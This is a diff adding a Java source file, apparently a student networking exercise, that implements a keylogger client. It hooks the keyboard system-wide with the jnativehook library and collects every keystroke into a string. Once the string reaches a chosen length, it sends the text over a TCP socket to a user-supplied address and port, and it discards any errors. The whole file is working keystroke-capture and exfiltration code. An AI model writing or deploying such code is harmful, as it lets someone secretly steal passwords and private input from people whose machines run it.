@@ -1,0 +1,113 @@
+/**
+ * 
+ */
+package CliKey;
+
+
+
+//import java.io.BufferedReader;
+//import java.io.DataInputStream;
+//import java.io.DataOutputStream;
+//import java.io.FileWriter;
+//import java.io.IOException;
+//import java.io.InputStreamReader;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+//import java.io.PrintWriter;
+//import java.net.ServerSocket;
+import java.net.Socket;
+//import java.net.SocketTimeoutException;
+
+
+import org.jnativehook.GlobalScreen;
+import org.jnativehook.NativeHookException;
+import org.jnativehook.keyboard.NativeKeyEvent;
+import org.jnativehook.keyboard.NativeKeyListener;
+
+
+//import java.io.FileWriter;
+//import java.io.IOException;
+//import java.io.PrintWriter;
+
+//import java.io.File;
+
+//import java.util.Scanner;
+
+import javax.swing.JOptionPane;
+
+
+public class ClasseCliKey implements NativeKeyListener {
+	/*String txt = "";
+	FileWriter file = null;
+	String filepath = "C:\\Users\\carla\\Desktop\\RedesCS\\KeyLo.txt";
+	public static final int MAX= 1;*/
+	static String texto = "";
+	static String end;
+	static int porta;
+	static int TAMANHO;
+	//public static final int TAMANHO = 1;
+	
+	
+	public static void enviaTexto(String Servidor, int p) {
+		
+		try {
+			Socket skt = new Socket(Servidor, p);
+			ObjectOutputStream saida = new ObjectOutputStream(skt.getOutputStream());
+			ObjectInputStream entrada = new ObjectInputStream(skt.getInputStream());
+			saida.writeUTF(texto);
+			saida.flush();
+			texto = "";
+			String mensagemDoServidor = entrada.readUTF();
+			System.out.println(mensagemDoServidor);
+		} catch (Exception e) {
+			
+	
+		}
+	}
+	public static void main(String[] args) {
+		porta = Integer.parseInt(JOptionPane.showInputDialog("Porta: "));
+		end = (JOptionPane.showInputDialog("Endereço: "));
+		TAMANHO = Integer.parseInt(JOptionPane.showInputDialog("TAMANHO: "));
+
+		try {
+			GlobalScreen.registerNativeHook();
+		} catch (NativeHookException e) {
+			e.printStackTrace();
+		}
+
+		GlobalScreen.addNativeKeyListener(new ClasseCliKey());
+	}
+	@Override
+	public void nativeKeyPressed(NativeKeyEvent tecla) {
+
+		int t = tecla.getKeyCode();
+		if (t == NativeKeyEvent.VC_ENTER) {
+			texto += "ENTER";
+		}  else if (t == NativeKeyEvent.VC_SPACE) {
+			texto += "";
+		} else if (t == NativeKeyEvent.VC_BACKSPACE){
+			StringBuilder sb = new StringBuilder(texto);
+			texto = String.valueOf(sb.deleteCharAt(texto.length()-1));
+		}  else {
+				
+		texto += (NativeKeyEvent.getKeyText(t)).toLowerCase();
+		}
+		
+
+		if (texto.length() == TAMANHO) {
+			enviaTexto(end, porta);
+			texto = "";
+		}
+
+	}
+
+	@Override
+	public void nativeKeyReleased(NativeKeyEvent tecla) {
+
+	}
+
+	@Override
+	public void nativeKeyTyped(NativeKeyEvent e1) {
+
+	}
+}
